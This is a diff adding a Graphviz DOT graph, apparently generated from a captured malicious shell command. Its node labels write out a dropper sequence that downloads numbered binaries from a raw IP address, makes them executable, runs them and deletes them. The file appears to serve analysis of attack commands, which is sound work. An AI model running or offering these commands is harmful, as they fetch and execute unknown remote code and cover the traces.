@@ -1,0 +1,42 @@
+digraph {
+0 [label="wget http://199.101.48.210/10 "];
+0 -> 0
+2 [label="chmod +x 10 "];
+2 -> 4 [label=";,"];
+4 [label="./10 "];
+4 -> 6 [label=";,"];
+6 [label="rm -f 10* "];
+6 -> 8 [label=";,"];
+8 [label="wget http://199.101.48.210/11 "];
+8 -> 8
+10 [label="chmod +x 11 "];
+10 -> 12 [label=";,"];
+12 [label="./11 "];
+12 -> 14 [label=";,"];
+14 [label="rm -f 11* "];
+14 -> 16 [label=";,"];
+16 [label="wget http://199.101.48.210/12 "];
+16 -> 16
+18 [label="chmod +x 12 "];
+18 -> 20 [label=";,"];
+20 [label="./12 "];
+20 -> 22 [label=";,"];
+22 [label="rm -f 12* "];
+22 -> 24 [label=";,"];
+24 [label="wget http://199.101.48.210/13 "];
+24 -> 24
+26 [label="chmod +x 13 "];
+26 -> 28 [label=";,"];
+28 [label="./13 "];
+28 -> 30 [label=";,"];
+30 [label="rm -f 13* "];
+30 -> 32 [label=";,"];
+32 [label="wget http://199.101.48.210/14 "];
+32 -> 32
+34 [label="chmod +x 14 "];
+34 -> 36 [label=";,"];
+36 [label="./14 "];
+36 -> 38 [label=";,"];
+38 [label="rm -f 14* "];
+38 -> 39 [label=";,"];
+}
